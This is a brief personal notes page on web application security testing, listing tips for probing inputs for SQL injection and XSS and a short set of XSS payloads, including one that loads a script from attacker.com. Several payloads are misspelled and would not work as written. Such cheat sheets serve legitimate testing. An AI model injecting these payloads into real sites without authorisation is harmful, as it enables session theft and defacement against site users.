# Web AppSec Nots

**Web AppSec**

* try **SQLI** in any req maybe send to Database
* Search all **parameters**, **Endpoint** and **Functions** in JS files
* try to use Stored XSS payload in user input (comment fields, user profile, blog)
* try to Reflected-XSS Payload in user input (forms, search. name, username,bio, location,Fields)
* in Test XSS Use this Payload in the First  `()'Test><>'"<!-`
* &#x20;
*

**Were Tested the vulnerability**



## Payload

## XSS

* use escape any character `\`
* `<script>alert('1337')</script>`
* `<ifram src=javasrcipt:alert(1)>`
* `<body onload=prompt(1);>`
* `'><img src=x onerror=confirm(1);>`
* `<script>console.log(11)<!-`
* `<a onmouseove="alert(1)'>test</a>`
* `<script src=//attacker.com/test.js>`
